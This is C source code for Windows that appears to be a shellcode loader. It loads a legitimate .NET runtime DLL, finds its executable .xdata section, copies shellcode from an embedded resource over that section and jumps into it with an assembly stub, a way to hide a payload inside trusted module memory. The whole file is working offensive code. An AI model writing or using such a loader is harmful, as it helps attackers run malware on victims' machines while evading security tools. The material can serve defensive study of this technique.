#include <windows.h>
#include <stdio.h>

#include "resource.h"

EXTERN_C PVOID sjump(IN PVOID shellcode_address);

// C:\Users\user\AppData\Local\AzureFunctionsTools\Releases\2.60.0\cli_x64\System.Private.CoreLib.dll  [.xdata]

int main(int argc, char ** argv) {

    HMODULE hmod = LoadLibraryA("System.Private.CoreLib.dll");

    if (hmod == NULL) {
        printf("Failed to load library\n");
        return 1;
    }

    IMAGE_DOS_HEADER* dos_header = (IMAGE_DOS_HEADER*)hmod;
    IMAGE_NT_HEADERS* nt_headers = (IMAGE_NT_HEADERS*)((BYTE*)dos_header + dos_header->e_lfanew);
    IMAGE_SECTION_HEADER* section_header = IMAGE_FIRST_SECTION(nt_headers);

    // Look for section with RWX ("/4" in msys-2.0.dll)
    for (int i = 0; i < nt_headers->FileHeader.NumberOfSections; i++) {
        if (strcmp(section_header[i].Name, ".xdata") == 0) {

            printf("SectionName->%s\n", section_header[i].Name);
            printf("VirtualAddress->0x%p\n", hmod + section_header[i].VirtualAddress);
            printf("SizeOfRawData->%d\n", section_header[i].SizeOfRawData);

            // Calculate section base with VirtualAddress RVA + HMODULE
            BYTE* sectionBase = (((BYTE *)hmod + section_header[i].VirtualAddress));

            // Load shellcode from resource to memory
            PSHELLCODE shellcode = NULL;
            shellcode = get_shellcode(NULL);

            printf("Shellcode->Size->%lli\n", shellcode->size);

            // Ensure that the shellcode isn't larger than the RWX section
            if (shellcode->size > section_header[i].SizeOfRawData) {
                printf("Size of payload larger than section size.\n");
            }

            // Overwrite section base with the shellcode
            for (int i = 0; i < shellcode->size; i++) {
                sectionBase[i] = shellcode->buf[i];
            }

            // Jump to the section
            // ((void (*)(void))sectionBase)();
            sjump(sectionBase);
        }
    }

    FreeLibrary(hmod);
    return 0;
}
